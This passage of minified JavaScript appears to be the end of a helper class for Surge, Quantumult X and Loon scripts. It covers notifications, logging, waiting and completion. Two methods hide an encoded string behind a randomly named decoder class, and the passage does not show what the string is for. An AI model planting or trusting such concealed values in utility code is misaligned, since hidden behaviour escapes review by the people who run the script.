      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}